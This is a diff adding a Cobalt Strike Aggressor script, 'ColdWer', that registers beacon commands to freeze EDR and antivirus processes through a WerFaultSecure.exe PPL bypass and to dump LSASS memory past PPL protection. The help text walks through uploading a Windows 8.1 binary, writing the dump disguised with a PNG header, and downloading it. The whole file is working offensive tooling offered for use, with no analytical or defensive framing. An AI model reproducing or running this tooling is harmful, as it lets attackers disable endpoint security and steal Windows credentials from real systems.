@@ -1,0 +1,123 @@
+#
+# ColdWer - A cold war on your endpoint.
+# Freeze your EDR/AV. Extract what you need. Stay cold.
+#
+#Author: Sh3llf1r3
+#GitHub: https://github.com/0xsh3llf1r3
+#
+
+alias cw-freeze {
+    local('$bid $pid $path $data $bof');
+    
+    $bid = $1;
+    $pid = $2;
+    $path = $3;
+    
+    if ($pid eq "") {
+        berror($bid, "Usage: cw-freeze <PID> [Path]");
+        berror($bid, "");
+        berror($bid, "Freeze a process using WerFaultSecure.exe PPL bypass.");
+        berror($bid, "Use cw-unfreeze to release when done.");
+        berror($bid, "");
+        berror($bid, "Arguments:");
+        berror($bid, "  PID   - Process ID to freeze");
+        berror($bid, "  Path  - Path to WerFaultSecure.exe (optional)");
+        berror($bid, "          Defaults to C:\\Windows\\System32\\WerFaultSecure.exe");
+        return;
+    }
+    
+    if ($path eq "") {
+        $path = "C:\\Windows\\System32\\WerFaultSecure.exe";
+    }
+    
+    $bof = readbof($bid);
+    if ($bof is $null) { return; }
+    
+    btask($bid, "ColdWer: Freezing PID " . $pid);
+    
+    $data = bof_pack($bid, "iiZ", 1, int($pid), $path);
+    beacon_inline_execute($bid, $bof, "go", $data);
+}
+
+alias cw-unfreeze {
+    local('$bid $data $bof');
+    
+    $bid = $1;
+    
+    $bof = readbof($bid);
+    if ($bof is $null) { return; }
+    
+    btask($bid, "ColdWer: Unfreezing");
+    
+    $data = bof_pack($bid, "iiZ", 3, 0, "");
+    beacon_inline_execute($bid, $bof, "go", $data);
+}
+
+alias cw-dump {
+    local('$bid $pid $path $data $bof');
+    
+    $bid = $1;
+    $pid = $2;
+    $path = $3;
+    
+    if ($pid eq "" || $path eq "") {
+        berror($bid, "Usage: cw-dump <PID> <Path>");
+        berror($bid, "");
+        berror($bid, "Dump LSASS memory using WerFaultSecure.exe PPL bypass.");
+        berror($bid, "Dump saved to C:\\Windows\\Temp\\lsass.dmp with PNG header.");
+        berror($bid, "");
+        berror($bid, "Note: Requires Windows 8.1 version of WerFaultSecure.exe!");
+        berror($bid, "      The system version won't work for dumping.");
+        berror($bid, "");
+        berror($bid, "Arguments:");
+        berror($bid, "  PID   - LSASS process ID");
+        berror($bid, "  Path  - Path to Win8.1 WerFaultSecure.exe (REQUIRED)");
+        berror($bid, "");
+        berror($bid, "Example:");
+        berror($bid, "  cd C:\\Windows\\Temp");
+        berror($bid, "  upload /bin/wfs.exe");
+        berror($bid, "  cw-dump 672 C:\\Windows\\Temp\\wfs.exe");
+        berror($bid, "  download C:\\Windows\\Temp\\lsass.dmp");
+        return;
+    }
+    
+    $bof = readbof($bid);
+    if ($bof is $null) { return; }
+    
+    btask($bid, "ColdWer: Dumping LSASS PID " . $pid);
+    
+    $data = bof_pack($bid, "iiZ", 2, int($pid), $path);
+    beacon_inline_execute($bid, $bof, "go", $data);
+}
+
+sub readbof {
+    local('$barch $handle $data $path');
+    $barch = barch($1);
+    
+    if ($barch eq "x64") {
+        $path = script_resource("coldwer.o");
+    } else {
+        berror($1, "ColdWer: x86 beacons not supported");
+        return $null;
+    }
+    
+    if (!-exists $path) {
+        berror($1, "ColdWer: BOF not found at " . $path);
+        return $null;
+    }
+    
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    return $data;
+}
+
+beacon_command_register("cw-freeze", "Freeze EDR/AV process using PPL bypass", "Usage: cw-freeze <PID> [Path]");
+
+beacon_command_register("cw-unfreeze", "Unfreeze previously frozen process", "Usage: cw-unfreeze");
+
+beacon_command_register("cw-dump", "Dump LSASS bypassing PPL protection", "Usage: cw-dump <PID> <Path>");
+
+println("[*] ColdWer loaded - Stay Cold.");
+println("[*] Commands: cw-freeze, cw-unfreeze, cw-dump");
